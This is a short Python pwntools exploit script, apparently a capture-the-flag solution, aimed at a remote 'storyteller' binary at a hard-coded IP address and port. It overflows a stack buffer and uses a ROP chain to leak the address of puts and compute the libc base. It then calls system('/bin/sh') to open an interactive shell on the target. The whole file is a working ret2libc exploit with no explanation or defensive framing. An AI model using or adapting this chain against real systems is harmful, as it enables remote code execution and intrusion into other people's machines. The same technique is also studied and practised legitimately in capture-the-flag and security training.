#!/usr/bin/env python3

from pwn import *

bin = context.binary = ELF("../give/storyteller")
libc = ELF("../give/libc.so.6")
p = remote("81.94.150.171", 10060)

pop_rdi = 0x00000000004011A2
ret = 0x0000000000401016

payload = b""
payload += 56 * b"A"
payload += p64(pop_rdi)
payload += p64(bin.got.puts)
payload += p64(bin.plt.puts)
payload += p64(bin.sym.vuln)

p.sendlineafter("Andreas\n", payload)
p.recvuntil("Sam)\n")

puts = u64(p.recv(6) + b"\0\0")
log.info("puts: " + hex(puts))
libc.address = puts - libc.sym.puts
log.info("libc.address: " + hex(libc.address))

payload = 56 * b"A"
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)

p.sendlineafter("Andreas\n", payload)
p.recvuntil("Sam)\n")
p.interactive()
